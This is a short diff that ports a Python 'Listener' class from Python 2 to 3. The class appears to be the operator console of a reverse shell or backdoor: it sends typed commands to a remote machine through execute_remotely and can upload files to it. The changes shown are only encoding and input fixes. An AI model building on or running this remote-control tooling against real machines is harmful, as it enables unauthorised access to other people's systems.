@@ -35,14 +35,16 @@ class Listener:
         """
         json_data = json.dumps(data)
         # json_data = json.dumps(data) # We convert the data into a json object
-        self.connection.send(json_data)
+        # self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         """
         Recieves json data and unwrap it
         :return: unwrapped data
         """
-        json_data = ""
+        # json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data += self.connection.recv(1024)
@@ -72,13 +74,14 @@ class Listener:
 
     def run(self):
         while True:
-            command = raw_input(">> ")
+            # command = raw_input(">> ")
+            command = input(">> ")
             command = command.split(" ")
 
             try:
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
-                    command.append(file_content)
+                    command.append(file_content.decode())
 
                 result = self.execute_remotely(command)
 
